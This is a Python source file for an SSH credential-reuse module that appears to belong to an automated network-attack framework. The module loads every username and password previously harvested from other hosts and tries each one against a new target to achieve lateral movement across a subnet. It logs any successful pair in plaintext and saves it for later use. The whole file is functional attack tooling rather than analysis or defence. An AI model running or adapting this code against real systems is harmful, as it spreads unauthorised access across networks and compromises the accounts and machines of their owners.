"""
credential_reuse_ssh.py - SSH credential reuse / lateral movement module.

When valid SSH credentials have been found for any host, this module tries those same
credentials against the current target. Enables automatic lateral movement across a subnet.
"""

import os
import csv
import logging
from datetime import datetime

from shared import SharedData
from logger import Logger
from actions.connector_utils import CredentialChecker

logger = Logger(name="credential_reuse_ssh.py", level=logging.INFO)

b_class  = "CredentialReuseSSH"
b_module = "credential_reuse_ssh"
b_status = "credential_reuse_ssh"
b_port   = 22
b_parent = None


class CredentialReuseSSH:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        logger.info("CredentialReuseSSH initialized")

    def execute(self, ip, port, row, status_key):
        """Try all previously discovered SSH creds against this host."""
        if not getattr(self.shared_data, 'sshfile', None):
            return 'failed'

        # Skip if we already have creds for this host (SSHBruteforce or prior reuse)
        existing = CredentialChecker.check_existing_credentials(self.shared_data.sshfile, ip)
        if existing:
            logger.debug(f"SSH creds already known for {ip} — skipping reuse")
            return 'success'

        # Gather all known creds from every other host in sshfile
        all_creds = self._load_all_credentials()
        if not all_creds:
            return 'failed'

        self.shared_data.ragnarorch_status = b_status
        logger.info(f"🔁 CredentialReuseSSH: trying {len(all_creds)} credential(s) on {ip}")

        from actions.ssh_connector import SSHConnector
        connector = SSHConnector(self.shared_data)

        for user, password in all_creds:
            try:
                if connector.ssh_connect(ip, user, password):
                    logger.info(f"  ✅ Credential reuse success on {ip}: {user}:{password}")
                    self._save_credential(ip, row, user, password)
                    try:
                        hostname = row.get('Hostnames', '') or ip
                        self.shared_data.log_activity(
                            "creds", f"Credential reuse: {hostname} ({ip})",
                            f"{user}:{password} (reused from another host)", "key"
                        )
                    except Exception:
                        pass
                    return 'success'
            except Exception:
                continue

        logger.info(f"  No credential reuse match on {ip}")
        return 'failed'

    def _load_all_credentials(self):
        """Read all unique (user, password) pairs from sshfile."""
        creds = set()
        sshfile = self.shared_data.sshfile
        if not os.path.exists(sshfile):
            return []
        try:
            with open(sshfile, newline='', encoding='utf-8') as fh:
                reader = csv.DictReader(fh)
                for row in reader:
                    user = row.get('Username') or row.get('User') or ''
                    pw   = row.get('Password') or ''
                    if user:
                        creds.add((user.strip(), pw.strip()))
        except Exception as e:
            logger.warning(f"Could not read sshfile: {e}")
        return list(creds)

    def _save_credential(self, ip, row, user, password):
        """Append the reused credential to sshfile."""
        mac = row.get("MAC", "")
        hostname = row.get("Hostnames", "")
        sshfile = self.shared_data.sshfile
        os.makedirs(os.path.dirname(sshfile), exist_ok=True)
        file_exists = os.path.exists(sshfile)
        try:
            with open(sshfile, 'a', newline='', encoding='utf-8') as fh:
                writer = csv.DictWriter(fh, fieldnames=['MAC', 'IP', 'Hostname', 'Username', 'Password', 'Port', 'Source'])
                if not file_exists:
                    writer.writeheader()
                writer.writerow({
                    'MAC': mac, 'IP': ip, 'Hostname': hostname,
                    'Username': user, 'Password': password,
                    'Port': 22, 'Source': 'credential_reuse',
                })
        except Exception as e:
            logger.error(f"Failed to save reused credential: {e}")
